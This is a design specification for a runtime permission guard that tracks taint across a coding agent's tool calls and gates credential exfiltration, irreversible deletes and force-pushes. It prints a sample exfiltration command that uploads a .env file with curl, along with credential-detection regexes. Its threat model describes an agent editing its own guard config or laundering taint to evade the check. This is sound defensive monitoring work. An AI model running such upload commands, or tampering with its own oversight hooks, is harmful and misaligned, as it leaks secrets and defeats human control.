# polycheck guard — technical specification

**Status:** draft v0.1 · **Companion:** [`runtime-guard.functional.md`](runtime-guard.functional.md)
**Baseline:** polycheck 0.3.1 — `src/scan.mjs`, `src/label.mjs`, `src/model.mjs`, `src/check.mjs`

---

## 1. Architecture

```
Claude Code
   │  PreToolUse  {session_id, tool_name, tool_input, cwd}
   ▼
bin/polycheck-guard.mjs          ← thin, fail-closed entry; parses stdin, writes stdout JSON
   │
   ├─ src/guard/ledger.mjs       ← load/append/persist the session effect ledger
   ├─ src/guard/runtime-label.mjs← labelCall(tool, input) → effects  (NEW, the hard part)
   ├─ src/guard/decide.mjs       ← the region test: complete? exercise? allow?
   ├─ src/guard/witness.mjs      ← render the path from ledger provenance
   ├─ src/guard/policy.mjs       ← read .claude settings; dedupe against rules the user wrote
   └─ src/guard/emit.mjs         ← the ONLY writer of stdout; closed union, cannot emit 'allow'
   ▼
stdout, when gating:
  {"hookSpecificOutput":{"hookEventName":"PreToolUse",
   "permissionDecision":"ask"|"deny","permissionDecisionReason":"<witness>"}}
stdout, when standing aside (passthrough):
  {}                       ← no permissionDecision key; rules + classifier resolve
```

**`"allow"` is never emitted.** This is enforced in code, not by convention: the
emitter (`src/guard/emit.mjs`) accepts a closed union `'ask' | 'deny' | null`, and
`null` renders `{}`. There is no code path that can produce the string `allow`, and
a test greps the built output for it. See functional §1.1 — the guard reinforces the
auto-mode classifier and never overrides it.

Everything under `src/guard/` is new. Nothing in `src/*.mjs` changes behaviour; the
guard *imports* `label.mjs` and `scan.mjs` and reuses `data/*.json`.

### 1.1 What is reused, precisely

| existing | reused how |
|---|---|
| `data/claude-code.labels.json` | effect vocabulary, `sensitivePaths`, `sensitiveExemplars`, `bashPatterns`, `bashArbitraryExecution` — the guard's runtime pack *extends* it, never forks it |
| `data/regions.json` | region shape and the two safety regions; runtime pack adds `irreversible` regions |
| `src/label.mjs` `coversSensitive`, `anyMatch`, `globToRe`, `normPath` | promoted to exported helpers; the runtime labeler calls them on *concrete paths* instead of globs |
| `src/scan.mjs` `scanRepo` | read at `SessionStart` to know the written `ask`/`deny` rules the guard must not override |
| `src/check.mjs` | **not** reused in the hot path. BFS is unnecessary at runtime — see §4.2 |

### 1.2 What is explicitly *not* BFS

The linter explores the reachable state graph because it does not know which
actions will fire. The guard knows: one call, one known held mask. The runtime
decision is a **bitmask test**, O(regions). `check.mjs` remains the deploy-time
engine and is invoked only by `guard init` (§8).

---

## 2. Hook wiring

Written by `polycheck guard init` into `.claude/settings.json`. **Verified shape**
(WP0 — see [`WP0-findings.md`](WP0-findings.md)):

```jsonc
{
  "hooks": {
    "SessionStart": [{ "hooks": [
      { "type": "command", "command": "node", "args": ["<abs>/bin/polycheck-guard.mjs", "session-start"], "timeout": 10 }] }],
    "PreToolUse": [{ "matcher": "*", "hooks": [
      { "type": "command", "command": "node", "args": ["<abs>/bin/polycheck-guard.mjs", "pre"],
        "if": "Bash(*)", "timeout": 10 }] }]
    // …one entry per effect-bearing tool; see the `if` note below.
  }
}
```

Three things WP0 settled, all of which the earlier draft got wrong:

- **`args` (exec form), not a command string.** `args` spawns the executable
  directly with no shell, so Windows backslash paths never reach a parser. The
  single-string form is not safe here.
- **`if` filters before the process spawns**, and takes permission-rule syntax
  (`"Bash(git *)"`). Given the measured cold-start floor (§9) this is the primary
  latency mitigation, not an optimization: `guard init` emits `if` filters covering
  only effect-bearing tools so the guard never pays a spawn on a call it would pass
  through anyway.
- **Hooks hot-reload** — no session restart needed after `guard init`.

Also discovered: a **`PermissionRequest`** event fires when a permission decision is
being sought, carrying `permission_suggestions`. It is a better home for the witness
than a guard-raised `ask` when the call was already going to prompt (functional
A1b); M1 evaluates it as the rendering surface, leaving `PreToolUse` `ask` for calls
that would not otherwise prompt.

> Wiring remains a compatibility surface. Field names and event semantics are pinned
> in `src/guard/compat.mjs` against what WP0 observed, and `guard init` refuses to
> install against a host whose payload shape does not match.

### 2.0 `gateKind: 'guard'` — a verified gate, and why that is sound

The linter currently treats *any* matching `PreToolUse` hook as an **unverified
gate** (`gateKind: 'hook'` → `INCONCLUSIVE`), because a hook's logic is unreadable
and most hooks log or format rather than block. Installing the guard would therefore
knock a repo's own lint verdict off `PROOF` — unacceptable.

`scan.mjs` recognises the guard's own hook command and records `gateKind: 'guard'`,
which `check.mjs` treats as **verified** (not in the `UNVERIFIED` set). The soundness
argument, which must be reproduced verbatim in the report:

1. The guard's output union is `ask | deny | passthrough`; `allow` is unreachable
   (§1). So the guard can only *add* a gate to an edge, never remove one.
2. For a region `R` in the guard's configured `onComplete` set, the decision engine
   gates every call that completes `R` (§4.2 branch (a)) — a total function over the
   call, with every failure path resolving to `ask` (§2.1, §3.3 I4).
3. Therefore no gate-free path into `R` survives, which is exactly the linter's
   proof obligation.

**The scope of the claim is exactly `onComplete`.** A region the guard is not
configured to gate keeps its old verdict; the guard is not a blanket green light.
Two guardrails on this, both fixture-tested:

- **G-a** — `gateKind: 'guard'` is granted per region, not per action. `check.mjs`
  consults the guard's configured region set, read from
  `.claude/polycheck.guard.json`. If that file is absent, unreadable, or names a
  region pack the linter cannot load, the hook falls back to `gateKind: 'hook'`
  (unverified). **A guard we cannot confirm is configured is not a gate.**
- **G-b** — The recognition is on the *command string shape* plus a version check,
  and any mismatch degrades to `'hook'`. A user hand-writing a hook that merely
  looks like polycheck's does not inherit the verdict.

The soundness argument rests on point 1. If `allow` ever becomes emittable, this
verified-gate status must be withdrawn in the same change. That coupling is recorded
as a comment at both sites and asserted by a test that fails if `emit.mjs`'s union
widens.

Any *other* hook remains unverified, unchanged.

### 2.1 Hook I/O contract
- Input: JSON on stdin. Always present: `session_id`, `transcript_path`, `cwd`,
  `hook_event_name`, `tool_name`, `tool_input`. **Optional** (observed on some
  events only, so never assumed): `prompt_id`, `permission_mode`, `effort`,
  `tool_use_id`. `PostToolUse` adds `tool_response` + `duration_ms`;
  `PermissionRequest` adds `permission_suggestions`. All access goes through
  `compat.field()` so host drift surfaces in one place.
- Output: JSON on stdout as shown in §1 — `ask`, `deny`, or `{}`. Exit 0 always.
- Any exception, timeout, or unparseable input → stdout `ask` + stderr diagnostic,
  exit 0. (Passthrough would also be safe here, since the classifier still runs; we
  choose `ask` so a guard malfunction is *visible* rather than silently absent.)
- Exit non-zero is reserved for "could not emit at all" and treated as blocking.

---

## 3. The ledger

### 3.1 Location and permissions
`<stateDir>/sessions/<session_id>.json`, where `stateDir` is
`%LOCALAPPDATA%\polycheck` (win32) or `${XDG_STATE_HOME:-~/.local/state}/polycheck`.
Mode `0600` where the platform supports it. **Never inside the repo** — a ledger in
`.claude/` would be committed, shared, and trusted across machines.

### 3.2 Schema

```jsonc
{
  "v": 1,
  "sessionId": "…",
  "cwd": "…",
  "parent": null,                       // parent sessionId for subagents
  "basis": "observed",
  "steps": [                            // append-only, ordered, the provenance trail
    { "n": 12, "tool": "Read", "target": "~/.aws/credentials",
      "adds": { "capability": ["sensitive"], "observed": ["sensitive"] },
      "decision": "allow", "why": "no region completed" }
  ],
  "held": {
    "capability": ["untrusted", "egress"],
    "observed":   ["untrusted"]
  },
  "entered":  [ { "region": "credential-egress", "atStep": 13 } ],
  "grants":   [ { "region": "credential-egress", "effect": "egress",
                  "providerKey": "curl→hooks.example.com", "atStep": 13 } ],
  "digest": "sha256:…"                  // over everything above; tamper-evident, not tamper-proof
}
```

### 3.3 Invariants
- **I1 — Append-only.** `steps` only grows. `held.*` only grows. No effect is ever
  removed; the `observed` basis is a *separate monotone set*, not a retraction of
  `capability`. This is what preserves the linter's monotonicity argument.
- **I2 — Write-then-decide ordering.** The Pre hook computes the decision, then
  persists the step atomically (write temp + rename) **before** emitting `allow`. A
  crash between decision and persist must not lose taint.
- **I3 — Unknown session ⇒ empty ledger ⇒ conservative.** A missing ledger is not
  an error; it is a session with no held effects, which yields *more* prompts, not
  fewer.
- **I4 — A corrupt or digest-mismatched ledger is not repaired.** It is quarantined
  and the session restarts with an empty ledger *plus* a sticky `ask` on every
  region-relevant call for the remainder of the session, with the reason stated.

### 3.4 Lifecycle mapping

| event | action |
|---|---|
| `SessionStart` source `startup`\|`clear` | new ledger |
| `SessionStart` source `resume` | load existing ledger by `session_id`; if absent, empty + note |
| compaction | no-op (ledger is not derived from the transcript) |
| `Task` spawn | see §7 |
| session end | ledger retained for `guard replay`; GC after N days (config, default 7) |

---

## 4. The decision engine

### 4.1 Inputs
- `H` — held mask on the configured basis, from the ledger.
- `E` — effects this call would add, from the runtime labeler (§5), as a mask, plus
  a per-effect `certainty ∈ {observed, capability, worst-case}`.
- `R` — runtime regions, each with `mask`, `action ∈ {ask, deny}`.
- `P` — the written policy (from `scanRepo`), for the §7.3 override guard.

### 4.2 Algorithm

```js
// decision ∈ { 'ask', 'deny', null }.  null renders as {} — passthrough.
// There is deliberately no 'allow' branch anywhere in this function.
function decide({ H, E, regions, grants, entered, policy, call }) {
  const after = H | E;
  for (const r of regions) {
    const wasIn = (H & r.mask) === r.mask;
    const nowIn = (after & r.mask) === r.mask;

    // (a) this call COMPLETES the region
    if (!wasIn && nowIn) {
      // If a written rule already gates this call, we are decorating that prompt,
      // not adding one (functional A1b). Same decision either way; the flag only
      // affects reporting and the replay metric.
      const dup = policy.alreadyGates(call);
      return { decision: r.action, region: r, decorates: dup,
               witness: witnessFor(r, ledger, call) };
    }
    // (b) region already entered; this call exercises a required effect through
    //     a provider no prior approval covered
    if (wasIn && (E & r.mask) !== 0 && !coveredByGrant(grants, r, call)) {
      return { decision: r.action, region: r, witness: witnessFor(r, ledger, call),
               note: 'a different channel was approved earlier' };
    }
  }
  return { decision: null, prewarn: oneStepShort(after, regions) };  // passthrough
}
```

`oneStepShort` returns regions where `popcount(mask & ~after) === 1`, driving the
pre-warning of functional §6.3.

### 4.3 `irreversible` in the region algebra
`irreversible` is a **call-local** effect: it is contributed by `E` and recorded in
`steps`, but it is **not** added to `held`. Consequently a region requiring it
(`{untrusted, irreversible}`) is evaluated as *"held effects ∪ this call's effects"*
— which the algorithm above already does via `after`. `wasIn` is therefore never
true for such a region, so branch (b) never fires and every irreversible call in a
tainted session is gated. That is the intended semantics and it must be asserted in
tests, because it is the one place where the monotone story does not apply.

A separate `unrecoverable` tier (force-push to a default branch, DB drop, spend)
is a plain unconditional rule, not a composition. It is implemented in the same
labeler for convenience and **labelled in the report as a rule, not as a polycheck
result** — the project's credibility rests on not blurring these.

### 4.4 Scoped grants
`providerKey(call)` normalizes the channel:

| call shape | providerKey |
|---|---|
| network command / `WebFetch` | `<tool>→<host>` (lowercased, port-stripped) |
| `git push` | `git-push→<remote-url-host>/<path>` |
| MCP tool | `<full-tool-name>` |
| filesystem write/delete | `<tool>→<normalized-root>` |
| unparseable target | `<tool>→*` — and a `*` grant is **never** issued from an approval; it can only ever match nothing |

The last row matters: an unparseable target must not become a wildcard grant.

### 4.5 Decision record
Every decision appends a step and, under `--log`, writes a JSONL line with
`{n, tool, providerKey, E, H, decision, region, basisUsed, labelerRuleIds}`.
`labelerRuleIds` is what makes a bad decision debuggable — you can point at the
pattern that fired.

---

## 5. The runtime labeler (`labelCall`) — the load-bearing component

**This is where the engineering risk lives.** `src/label.mjs` maps a *rule*
(`Bash(curl:*)`); the guard maps an *invocation* (`curl -s -T .env https://x/$(hostname)`).

### 5.1 Signature

```js
labelCall(toolName, toolInput, labels, opts) →
  { effects: Map<effect, {certainty, ruleId, evidence}>,
    target: {kind, host?, path?, remote?},
    parse: {ok, reason} }
```

### 5.2 Non-shell tools
Direct and mostly reliable:

- `Read` / `Grep` / `Glob` — resolve `file_path`/`path` against `cwd`, then reuse
  `label.mjs`'s sensitive-path matching on the **concrete path** (much sharper than
  glob-covers-exemplar).
- `WebFetch` / `WebSearch` — `untrusted`; `egress` when the URL carries a query or
  body (per the existing label note that WebFetch is both).
- `Write` / `Edit` — no exfil effect (as today); `irreversible` only under the
  `unrecoverable` tier (e.g. writing outside the project root).
- MCP tools — reuse the existing `mcp.egressToolPatterns` verb matching on the real
  tool name; `untrusted` by default per the current pack.

### 5.3 Shell commands — the hard part
`Bash` / `PowerShell` input is a command *string*. Design:

1. **Tokenize and split** on `;`, `&&`, `||`, `|`, newlines, and command
   substitution boundaries into a list of simple commands. Each simple command is
   labeled independently; the call's effects are the **union**.
2. **Per-command labeling** by executable name, against a new
   `data/claude-code.runtime.labels.json` with argument-aware rules:

```jsonc
{
  "commands": {
    "curl": { "egress": true,
              "sensitiveWhenArgMatches": ["-T", "--upload-file", "-d@", "--data-binary@"],
              "hostFrom": "url" },
    "rm":   { "irreversible": true, "unrecoverableWhenArgMatches": ["-r.*f|-f.*r"],
              "safeWhenPathUnder": ["${cwd}"] },
    "git":  { "subcommands": { "push": { "egress": true,
                "unrecoverableWhenArgMatches": ["--force(-with-lease)?|\\+"] } } }
  }
}
```

3. **Escalation triggers → worst-case, never benign.** Command substitution
   (`$(…)`, backticks), `eval`, `source`, base64/`printf`-into-shell, a variable in
   executable position, `xargs`, `find -exec`, and anything already in
   `labels.bashArbitraryExecution` yield the declared worst-case effect set and
   `parse.ok = false`. This mirrors the linter's ARBITRARY-EXECUTION treatment and
   is the reason an obfuscated command produces a prompt rather than a hole.
4. **Unknown executable** → worst-case `{untrusted, sensitive, egress}` with
   certainty `worst-case`, and a one-line notice naming the executable so the user
   can add a rule. Under-labeling is the failure mode that kills this product;
   the default must be loud, not quiet.

### 5.4 Sharpening via `PostToolUse`
The post hook receives `tool_response`. It adds `observed` effects:

- `Read`/`Grep` — the returned bytes match a credential shape (`AKIA[0-9A-Z]{16}`,
  `-----BEGIN [A-Z ]*PRIVATE KEY-----`, `xox[baprs]-`, high-entropy assignment to a
  key-shaped name, …) → `observed: sensitive`.
- `WebFetch` — a non-empty body was returned → `observed: untrusted`.
- Bash — a non-zero exit means the *capability* effect stands (it was attempted)
  but no `observed` effect is added.

Detection patterns live in the runtime label pack; false negatives here cause
*missed gates only under `basis: observed`*, which is why `capability` remains the
default for headless runs. **State this trade in `guard status`.**

---

## 6. Policy interaction (`src/guard/policy.mjs`)

Because the guard cannot emit `allow`, rule matching is no longer load-bearing for
safety — it cannot cause a bypass however wrong it is. Its only job is
`alreadyGates(call)`: does a written `ask`/`deny` already cover this call? That flag
feeds A1b reporting and the prompt copy ("this call was already gated; here is why
it also completes a region"), never the decision itself.

At `SessionStart`, `scanRepo(cwd)` runs once and the rule set is cached in the
ledger. Requirements, both now merely about noise:

- **R1** — An undecidable match answers **yes** (assume already gated). Worst case:
  the guard under-reports its own added-prompt count in the metric.
- **R2** — `alreadyGates` must never be consulted before branch (a) of §4.2. A
  region-completing call is gated regardless of what the rules say.

**This is a large simplification versus the pre-decision draft**, where mis-matching
a rule could have let the guard `allow` past it. That failure mode no longer exists.

---

## 7. Subagent taint (closes the linter's named v1 gap)

- On a `PreToolUse` for `Task`, the guard records the parent ledger's `held` in a
  pending-spawn record keyed by `(parentSessionId, n)`.
- The subagent's `SessionStart` seeds its ledger from the most recent unconsumed
  pending-spawn record for its parent, setting `parent`.
- On subagent completion (`SubagentStop`, or parent's `PostToolUse` for `Task`),
  the child's `held` is unioned into the parent's — a subagent that read a secret
  taints the parent that spawned it.

**Correlating child to parent is the risky part** (the child's hook payload may not
name its parent). If correlation cannot be established reliably on the installed
version, M3 falls back to *seeding only* (parent → child, which is sound and
strictly conservative) and the back-propagation is deferred with the gap restated
in the README rather than silently claimed closed.

---

## 8. `guard init` — coupling deploy-time to runtime

1. Run `analyze(root)` (existing `src/index.mjs`).
2. Report the verdict. If **PROOF**, say so and offer a *minimal* ledger config
   tracking only effects that appear in a reachable region — often a near-no-op.
3. If **BYPASS**, print the witness and state which step the guard will gate.
4. If **SHELL-EQUIVALENT**, warn plainly: with an unrestricted shell grant the
   guard's labeler is the *only* thing standing between the session and the region,
   and it is a labeler, not a proof. Recommend fixing the grant first.
5. Write the hook wiring only after the user confirms.

---

## 9. Performance — measured, not estimated

WP0 numbers (Windows 11 native, node v24.12.0, McAfee present, Defender realtime
off). Full context in [`WP0-findings.md`](WP0-findings.md).

| | ms |
|---|---|
| `cmd /c exit` | 20 |
| `git --version` | 40 |
| **`node -e ""`** | **780** |
| **guard's own work (parse + decide + record)** | **4.7 median** |

Node cold start dominates by two orders of magnitude and is node-specific — other
process spawns on the same box are fine. Consequences, all of which revise the
earlier draft:

- **A5 is restated as a marginal budget**: *the guard adds ≤ 15 ms above the host's
  node cold-start floor*. An absolute p95 is not a property the guard can control.
  Measured marginal cost is ~5 ms.
- **The `if` filter is the mitigation.** No spawn, no floor, for every call the
  guard would have passed through anyway (§2).
- **The daemon is dropped from the roadmap.** A daemon still needs a client process
  per call; a Node client pays the same 780 ms, and a non-Node client would forfeit
  the project's zero-dependency posture. Install docs get an AV-exclusion note
  instead.
- 780 ms is *this machine*. ~50 ms is the reference figure for a clean machine and
  is **not measured here** — re-measure before publishing any latency claim.
- Ledger I/O: single small JSON read + atomic write per call. Cap `steps` at N
  (default 2000) with head-truncation that **preserves the first contributor of
  each held effect**, so witnesses never lose their origin step.

---

## 10. Testing

- **Unit** — `labelCall` table tests over a corpus of real command strings,
  including every escalation trigger in §5.3. Each case asserts effects *and*
  `ruleId`.
- **Fixture replay** — for each existing linter fixture, a scripted call sequence
  that walks its witness; assert the gate fires exactly at the completing step and
  nowhere earlier (functional A2).
- **No-widening (A3)** — two tests: (i) over all fixtures, fault injections and
  fuzzed stdin, the emitted decision is always `ask`, `deny`, or `{}`; (ii) a source
  assertion that `emit.mjs`'s decision union is exactly `'ask' | 'deny' | null`,
  which fails if the union widens — the trip-wire that guards §2.0's soundness
  argument and the `gateKind: 'guard'` verified status.
- **Golden decisions** — `guard replay` over recorded logs produces byte-identical
  decision records (A4).
- **Fault injection** — corrupt ledger, read-only state dir, malformed stdin,
  thrown exception, timeout; each must yield `ask` (A6).
- **Compat** — `src/guard/compat.mjs` asserts the hook I/O shape against the
  installed Claude Code version; the test fails loudly on drift rather than
  degrading silently.

---

## 11. Threat model of the guard itself

| threat | treatment |
|---|---|
| ledger tampering to launder taint | digest is tamper-*evident*; mismatch ⇒ quarantine + sticky ask (I4). Not tamper-proof: an attacker with local write access has already won at a lower layer. State this. |
| the agent editing its own guard config | `.claude/polycheck.guard.json` and the hook block are added to the linter's `sensitivePaths`; an `Edit` targeting them is `irreversible`-tier and gated |
| `failOpen: true` in config | refused; logged; treated as absent |
| guard used to bypass a written `ask` or the classifier | **structurally impossible** — no `allow` in the output union (§1) |
| labeler under-labels a novel channel | unknown executables are worst-case (§5.3.4). Residual risk is a *missing extra gate*; the call still faces rules + classifier. Named in "what this does not establish" |
| guard config edited to shrink `onComplete`, laundering a lint `PROOF` | `check.mjs` reads the live config (G-a); a shrunk `onComplete` narrows the verified-gate claim in the same run, so the verdict moves with it. The config file is itself in `sensitivePaths` (row 2) |

---

## 12. Open questions

1. ~~Does a `PreToolUse` `allow` bypass the auto-mode classifier?~~ **RESOLVED —
   moot by decision.** The guard never emits `allow`; it reinforces the classifier
   and never overrides it. Prompt reduction (old G1) is withdrawn as a goal in
   favour of prompt *quality* (functional §1.3, §3 G2). Recorded here because the
   whole design leans on it: §2.0's verified-gate soundness, §6's simplification,
   and the threat model all follow from this one choice.
2. **Partially answered (WP0):** `session_id` was stable across a long live
   session. Behaviour across **compaction** and **`--resume`** is still untested and
   §3.4 depends on it.
3. Can the child of a `Task` spawn be correlated to its parent from hook payloads
   alone? (§7 fallback if not.)
4. Should the ledger be repo-scoped rather than session-scoped for long-running
   work across sessions? Argument against: cross-session taint has no expiry story
   and would accumulate into permanent prompting. Default no; revisit with data.
5. ~~Windows named-pipe daemon viability~~ **RESOLVED — daemon dropped** (§9).
6. **New (WP0): should the classifier be targeted directly instead?** Settings carry
   an `autoMode` block (`allow` / `soft_deny` / `hard_deny` / `environment`, with a
   `$defaults` sentinel) that customizes the auto-mode classifier declaratively.
   A `polycheck --emit-automode` would compile the policy + label pack into
   classifier rules — deploy-time, no code in the critical path, and it strengthens
   the 89% screen rather than sitting beside it. Evaluate before M1 commits further;
   it may be a better-positioned product than the guard.
